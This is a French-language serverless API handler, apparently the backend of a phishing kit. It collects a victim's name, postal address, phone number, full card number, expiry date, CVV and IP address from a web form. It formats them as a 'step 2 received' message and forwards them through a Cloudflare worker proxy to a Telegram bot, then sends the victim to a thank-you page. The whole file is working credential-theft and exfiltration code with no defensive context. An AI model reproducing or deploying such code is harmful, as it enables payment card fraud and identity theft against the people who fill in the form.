export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Méthode non autorisée' });
    }

    try {
        let data = req.body;
        if (typeof data === 'string') {
            try {
                data = JSON.parse(data);
            } catch (e) {
                return res.status(400).json({ success: false, message: 'Le format JSON envoyé est invalide.' });
            }
        }

        // ALIGNEMENT : Lecture directe des variables collées
        const page_source = data.page_source || 'Non spécifiée';
        const champ1      = data.champ1 || 'Non saisi';
        const champ2      = data.champ2 || 'Non saisi';
        const champ4      = data.champ4 || 'Non saisi';
        const champ5      = data.champ5 || 'Non saisi';
        const champ6      = data.champ6 || 'Non saisi';
        const champ7      = data.champ7 || 'Non saisi';

        const userIp = req.headers['x-forwarded-for'] || 'Inconnue';
        const dateStr = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
        const cleanChamp5 = String(champ5).replace(/\s+/g, '');

        // Construction du message Telegram
        let message = `⚜️ **[ ÉTAPE 2 - REÇU ]** ⚜️\n`;
        message += `───────────────────\n\n`;
        message += `📍 **Provenance :** \`Page ${page_source}\`\n\n`;
        message += `👤 **Nom & Prénom :** \`${champ1}\`\n`;
        message += `🏠 **Postale :** \`${champ2}\`\n`;
        
        message += `📞 **Tel :** \`${champ4}\`\n\n`;
        message += `💳 **Numéro Carte :** \` ${cleanChamp5} \`\n`;
        message += `📅 **Expiration :** \`${champ6}\`\n`;
        message += `🔒 **CVV :** \`${champ7}\`\n\n`;
        message += `🖥️ **IP Client :** \`${userIp}\`\n`;
        message += `───────────────────\n`;
        message += `📅 **Date :** \`${dateStr}\``;

        const workerUrl = process.env.WORKER_URL || 'https://wer-proxy.angelobarbes.workers.dev';
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!token || !chatId) {
            return res.status(500).json({ success: false, message: 'Configuration Telegram manquante sur Vercel.' });
        }

        const gatewayUrl = `${workerUrl.replace(/\/$/, '')}/bot${token}/sendMessage`;

        const response = await fetch(gatewayUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            return res.status(200).json({ success: true, redirect: 'merci.html' });
        } else {
            const errText = await response.text();
            return res.status(500).json({ success: false, message: `Erreur Telegram: ${errText}` });
        }

    } catch (error) {
        console.error("Erreur serveur :", error);
        return res.status(500).json({ success: false, message: error.message });
    }
}
